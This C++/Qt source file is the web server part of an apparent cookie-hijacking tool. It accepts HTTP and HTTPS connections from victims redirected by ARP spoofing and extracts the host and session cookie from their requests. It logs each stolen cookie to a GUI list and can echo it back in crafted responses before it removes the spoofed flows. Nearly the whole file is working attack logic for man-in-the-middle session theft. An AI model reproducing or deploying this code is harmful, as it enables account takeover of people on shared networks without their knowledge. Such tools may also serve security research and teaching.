#include "webserver.h"
#include "cookiehijack.h"

#include <QSslKey>

WebServer::WebServer(QObject *parent) : GStateObj(parent) {
	ch_ = dynamic_cast<CookieHijack*>(parent);
	Q_ASSERT(ch_ != nullptr);
}

WebServer::~WebServer() {
	close();
}

bool WebServer::doOpen() {
	if (tcpServer_ != nullptr)
		delete tcpServer_;
	tcpServer_ = new QTcpServer(this);
	prepareTcpServer(tcpServer_);
	if (!tcpServer_->listen(QHostAddress::AnyIPv4, httpPort_)) {
		SET_ERR(GErr::Fail, tcpServer_->errorString());
		return false;
	}

	if (sslServer_ != nullptr)
		delete sslServer_;
	sslServer_ = new QSslServer(this);

	QSslConfiguration sslConfiguration(QSslConfiguration::defaultConfiguration());

	QFile keyFile(keyFileName_);
	if (!keyFile.open(QIODevice::ReadOnly)) {
		SET_ERR(GErr::Fail, QString("can not open key file %1").arg(keyFileName_));
		return false;
	}
	QSslKey sslKey(&keyFile, QSsl::Rsa);
	sslConfiguration.setPrivateKey(sslKey);
	keyFile.close();


	QFile crtFile(crtFileName_);
	if (!crtFile.open(QIODevice::ReadOnly)) {
		SET_ERR(GErr::Fail, QString("can not open crt file %1").arg(crtFileName_));
		return false;
	}
	QSslCertificate sslCertificate(&crtFile);
	sslConfiguration.setLocalCertificate(sslCertificate);
	crtFile.close();

	sslServer_->setSslConfiguration(sslConfiguration);

	prepareTcpServer(sslServer_);
	prepareSslServer(sslServer_);
	if (!sslServer_->listen(QHostAddress::AnyIPv4, httpsPort_)) {
		SET_ERR(GErr::Fail, sslServer_->errorString());
		return false;
	}

	reSiteNo_.setPattern("GET /([0-9]*)");

	return true;
}

bool WebServer::doClose() {
	if (tcpServer_ != nullptr) {
		tcpServer_->close();
		delete tcpServer_;
		tcpServer_ = nullptr;
	}

	if (sslServer_ != nullptr) {
		sslServer_->close();
		delete sslServer_;
		sslServer_ = nullptr;
	}

	return true;
}

void WebServer::prepareAbstractSocket(QAbstractSocket* socket) {
	// QIODevice
	QObject::connect(socket, &QIODevice::readyRead, this, &WebServer::doReadyRead);

	// QAbstractSocket
	QObject::connect(socket, &QAbstractSocket::connected, this, &WebServer::doConnected);
	QObject::connect(socket, &QAbstractSocket::disconnected, this, &WebServer::doDisconnected);
	QObject::connect(socket, &QAbstractSocket::errorOccurred, this, &WebServer::doErrorOccurred);
	QObject::connect(socket, &QAbstractSocket::stateChanged, this, &WebServer::doStateChanged);
}

void WebServer::prepareSslSocket(QSslSocket* socket) {
	// QSslSocket
	QObject::connect(socket, &QSslSocket::handshakeInterruptedOnError, this, &WebServer::doHandshakeInterruptedOnError);
	QObject::connect(socket, &QSslSocket::modeChanged, this, &WebServer::doModeChanged);
	QObject::connect(socket, &QSslSocket::peerVerifyError, this, &WebServer::doPeerVerifyError);
	QObject::connect(socket, &QSslSocket::sslErrors, this, &WebServer::doSslErrors);
}

void WebServer::prepareTcpServer(QTcpServer* server) {
	QObject::connect(server, &QTcpServer::acceptError, this, &WebServer::serverAcceptError);
	QObject::connect(server, &QTcpServer::newConnection, this, &WebServer::serverNewConnection);
	QObject::connect(server, &QTcpServer::pendingConnectionAvailable, this, &WebServer::serverPendingConnectionAvailable);
}

void WebServer::prepareSslServer(QSslServer* server) {
	QObject::connect(server, &QSslServer::errorOccurred, this, &WebServer::serverErrorOccurred);
	QObject::connect(server, &QSslServer::sslErrors, this, &WebServer::serverSslErrors);
	QObject::connect(server, &QSslServer::startedEncryptionHandshake, this, &WebServer::serverStartedEncryptionHandshake);
}

void WebServer::doReadyRead() {
	qDebug() << "";
	QAbstractSocket* socket = dynamic_cast<QAbstractSocket*>(sender());
	Q_ASSERT(socket != nullptr);
	QTcpSocket* tcpSocket = dynamic_cast<QTcpSocket*>(socket);
	Q_ASSERT(tcpSocket != nullptr);
	QSslSocket* sslSocket = dynamic_cast<QSslSocket*>(socket);

	Map::Iterator it = segments_.find(socket);
	if (it == segments_.end())
		it = segments_.insert(socket, QString());
	QString& httpRequest = it.value();
	httpRequest += socket->readAll();
	qDebug() << httpRequest;


	if (sslSocket == nullptr) {
		if (httpRequest.startsWith("\u0016")) {
			qDebug() << "TLS Handshake!!!(0x16)!!!";
			socket->close();
			return;
		}
	}

	GIp ip = socket->peerAddress().toString();

	// if (sslSocket == nullptr)
	// 	tcpPreReadyRead(tcpSocket, httpRequest);
	// else
	// 	sslPreReadyRead(sslSocket);

	QString host, cookie;
	if (ch_->cookieHijack_.extract(httpRequest, host, cookie)) {
		qDebug() << "\n" << host << "\n" << cookie;

		QDateTime now = QDateTime::currentDateTime();
		doHijacked(now.toSecsSinceEpoch(), GMac::nullMac(), ip, host, cookie);
		time_t created = now.toSecsSinceEpoch();
		ch_->cookieHijack_.insert(created, GMac::nullMac(), ip, host, cookie);
	}

	if (httpRequest.indexOf("\r\n\r\n") == -1) return;
	qDebug() << "found \\r\\n\\r\\n";

	bool goodbye = false;

	QRegularExpressionMatch m = reSiteNo_.match(httpRequest);
	QString strSiteNo = m.captured(1);
	int siteNo = 0;
	if (strSiteNo == "") {
		qWarning() << "strSiteNo is null";
	} else {
		qDebug() << "strSiteNo=" + strSiteNo;
		siteNo = m.captured(1).toInt();
	}

	QStringList httpResponse = ch_->getHttpResponse(siteNo + 1, ch_->stealCookie_ ? cookie : QString());
	if (httpResponse.isEmpty()) {
		goodbye = true;
	} else {
		socket->write(httpResponse.join("\r\n").toUtf8());
		socket->close();
	}

	if (goodbye) {
		qDebug() << "Remove flows for " + QString(ip);
		GIntf* intf = ch_->autoArpSpoof_.intf();
		Q_ASSERT(intf != nullptr);
		GIp gateway = intf->gateway();
		ch_->autoArpSpoof_.removeFlows(ip, gateway, gateway, ip);
		socket->write(goodbyeMessage_.join("\r\n").toUtf8());
		socket->close();
		return;
	}
}

void WebServer::doConnected() {
	QAbstractSocket* socket = dynamic_cast<QAbstractSocket*>(sender());
	Q_ASSERT(socket != nullptr);

	qDebug() << QString("[connected] %1:%2\r\n").arg(socket->peerAddress().toString()).arg(QString::number(socket->peerPort()));
	segments_.insert(socket, QString());
}

void WebServer::doDisconnected() {
	QAbstractSocket* socket = dynamic_cast<QAbstractSocket*>(sender());
	Q_ASSERT(socket != nullptr);

	qDebug() << QString("[disconnected] %1:%2\r\n").arg(socket->peerAddress().toString()).arg(QString::number(socket->peerPort()));
	segments_.remove(socket);
}

void WebServer::doErrorOccurred(QAbstractSocket::SocketError socketError) {
	const QMetaObject& mobj = QAbstractSocket::staticMetaObject;
	QString value = mobj.enumerator(mobj.indexOfEnumerator("SocketError")).valueToKey(socketError);
	qDebug() << value;
}

void WebServer::doStateChanged(QAbstractSocket::SocketState socketState) {
	const QMetaObject& mobj = QAbstractSocket::staticMetaObject;
	QString value = mobj.enumerator(mobj.indexOfEnumerator("SocketState")).valueToKey(socketState);
	qDebug() << QString::number(socketState) << value;
}

void WebServer::doHandshakeInterruptedOnError(const QSslError& error) {
	qDebug() << error.errorString();
}

void WebServer::doModeChanged(QSslSocket::SslMode mode) {
	switch (mode) {
		case QSslSocket::UnencryptedMode: qDebug() << "UnencryptedMode"; break;
		case QSslSocket::SslClientMode: qDebug() << "SslClientMode"; break;
		case QSslSocket::SslServerMode: qDebug() << "SslServerMode"; break;
	}
}

void WebServer::doPeerVerifyError(const QSslError& error) {
	qDebug() << error.errorString();
}

void WebServer::doSslErrors(const QList<QSslError>& errors) {
	for (const QSslError& error: errors)
		qDebug() << error.errorString();
}

void WebServer::serverAcceptError(QAbstractSocket::SocketError socketError) {
	if (socketError == QAbstractSocket::UnknownSocketError) return;
	const QMetaObject& mobj = QAbstractSocket::staticMetaObject;
	QMetaEnum menum = mobj.enumerator(mobj.indexOfEnumerator("SocketError"));
	QString key = menum.valueToKey(socketError);
	qDebug() << "[accept error] " + key + "\r\n";
}

void WebServer::serverNewConnection() {
	qDebug() << "";
}

void WebServer::serverPendingConnectionAvailable() {
	QTcpServer* server = dynamic_cast<QTcpServer*>(sender());
	Q_ASSERT(server != nullptr);

	while (server->hasPendingConnections()) {
		QAbstractSocket* socket = server->nextPendingConnection();
		qDebug() << QString("[connected] %1:%2\r\n").arg(socket->peerAddress().toString()).arg(QString::number(socket->peerPort()));
		prepareAbstractSocket(socket);
		QSslSocket* sslSocket = dynamic_cast<QSslSocket*>(socket);
		if (sslSocket != nullptr)
			prepareSslSocket(sslSocket);

		segments_.insert(socket, QString());
	}
}

void WebServer::serverErrorOccurred(QSslSocket* socket, QAbstractSocket::SocketError socketError) {
	(void)socket;
	const QMetaObject& mobj = QAbstractSocket::staticMetaObject;
	QString value = mobj.enumerator(mobj.indexOfEnumerator("SocketError")).valueToKey(socketError);
	qDebug() << value;
}

void WebServer::serverSslErrors(QSslSocket* socket, const QList<QSslError>& errors) {
	(void)socket;
	for (const QSslError& error: errors)
		qDebug() << error.errorString();
}

void WebServer::serverStartedEncryptionHandshake(QSslSocket* socket) {
	(void)socket;
	qDebug() << "";
}

#include "chwidget.h"
void WebServer::doHijacked(time_t created, GMac mac, GIp ip, QString host, QString cookie) {
	(void)created;
	(void)mac;
	(void)ip;
	ChWidget* chWidget = dynamic_cast<ChWidget*>(ch_->parent());
	Q_ASSERT(chWidget != nullptr);
	chWidget->addItem(host, cookie);
}

#ifdef QT_GUI_LIB

#include "base/prop/gpropitem-filepath.h"
GPropItem* WebServer::propCreateItem(GPropItemParam* param) {
	if (QString(param->mpro_.name()) == "keyFileName") {
		GPropItemFilePath* res = new GPropItemFilePath(param);
		QStringList filters{"key files - *.key(*.key)", "any files - *(*)"};
		res->fd_->setNameFilters(filters);
		return res;
	}
	if (QString(param->mpro_.name()) == "crtFileName") {
		GPropItemFilePath* res = new GPropItemFilePath(param);
		QStringList filters{"crt files - *.crt(*.crt)", "any files - *(*)"};
		res->fd_->setNameFilters(filters);
		return res;
	}
	return GObj::propCreateItem(param);
}

#endif // QT_GUI_LIB
